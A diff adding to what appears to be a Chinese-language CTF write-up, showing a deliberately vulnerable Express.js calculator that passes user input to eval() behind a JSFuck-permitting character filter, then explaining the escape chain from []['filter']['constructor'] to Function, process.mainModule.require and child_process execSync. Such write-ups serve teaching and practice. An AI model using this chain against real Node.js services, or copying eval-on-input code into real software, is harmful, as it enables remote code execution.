@@ -52,4 +52,194 @@ CALL buy_item(3, 50)：手动调用存储过程，购买 ID 3 的商品，并欺
 
 <img width="2130" height="665" alt="image" src="https://github.com/user-attachments/assets/a3e676b5-803b-4558-b439-3fbfab690292" />
 
+```javascript
+const express = require('express');
+const app = express();
+const port = 5000;
 
+app.use(express.json());
+
+
+const WAF = (recipe) => {
+    const ALLOW_CHARS = /^[012345679!\.\-\+\*\/\(\)\[\]]+$/;
+    if (ALLOW_CHARS.test(recipe)) {
+        return true;
+    }
+    return false;
+};
+
+
+function calc(operator) {
+    return eval(operator);
+}
+
+app.get('/', (req, res) => {
+    res.sendFile(__dirname + '/index.html');
+});
+
+
+app.post('/calc', (req, res) => {
+    const { expr } = req.body;
+    console.log(expr);
+    if(WAF(expr)){
+        var result = calc(expr);
+        res.json({ result });
+    }else{
+        res.json({"result":"WAF"});
+    }
+});
+
+
+app.listen(port, () => {
+    console.log(`Server running on port ${port}`);
+});
+```
+服务器端用的是 eval() 执行用户输入
+
+限制 (WAF)：正则 /^[012345679!.-+*/()[]]+$/ 限制了输入字符。
+
+禁用了字母、引号、大括号等。
+
+允许了 []()!+，这正是 JSFuck 语言的核心字符集。
+
+这种题其实是 JavaScript 原型链 + Function 构造器利用，在很多 Node.js CTF Web RCE 里非常经典，但我没碰到过....所以还得从头来一遍，一般构造的是这样的，最基础的：
+```javascript
+[]["filter"]["constructor"]("return process")()
+```
+本质是在 不用直接写 Function 的情况下构造一个函数并执行。
+
+在 JavaScript 里：
+```javascript
+[].filter
+```
+是一个函数。
+
+也就是：
+```javascript
+[].filter === Array.prototype.filter
+```
+它其实长这样：
+```javascript
+function filter() { [native code] }
+```
+在 JS 里：
+```javascript
+function a(){}
+```
+它的：
+```javascript
+a.constructor
+```
+是：
+```javascript
+Function
+```
+验证：
+```javascript
+[].filter.constructor
+```
+结果就是：
+```javascript
+Function
+```
+所以：
+```javascript
+[]["filter"]["constructor"]
+```
+等价于：`
+```javascript
+Function
+```
+也就是：
+```javascript
+Function("code")
+```
+JavaScript 有一个 动态创建函数的方法：
+```javascript
+new Function("code")
+```
+例如：
+```javascript
+var f = new Function("return 1+1")
+f()
+```
+输出：
+```
+2
+```
+等价于：
+```javascript
+eval("1+1")
+```
+所以：
+```javascript
+Function("return process")()
+```
+就会执行：
+return process
+
+那么再结合起来看一遍：
+```javascript
+[]["filter"]["constructor"]("return process")()
+```
+第一步
+```javascript
+[]["filter"]
+```
+得到：
+```javascript
+function filter() { [native code] }
+```
+第二步
+```javascript
+[]["filter"]["constructor"]
+```
+得到：
+```javascript
+Function
+```
+第三步
+```javascript
+Function("return process")
+```
+创建函数：
+```javascript
+function(){
+  return process
+}
+```
+第四步后面的执行函数：
+```
+()
+```
+
+最终效果：
+```javascript
+process
+```
+在process中含有许多东西，我们可以通过process去调用require，就是一个关键链：
+
+process.mainModule.require //相当于require
+
+而require是加载模块（module）用的函数。
+简单理解：把别的代码文件或内置库引入进来使用。
+
+常见例子如下：
+```javascript
+const fs = require("fs")
+fs.readFileSync("flag.txt")
+```
+作用就是读取文件
+
+```javascript
+const cp = require("child_process")
+cp.execSync("ls")
+```
+作用是引入系统命令
+
+还有一种是引入自己写的文件，比如文件名为a.js
+```javascript
+const a = require("./a.js")
+console.log(a)
+```
+输出文件中写的内容
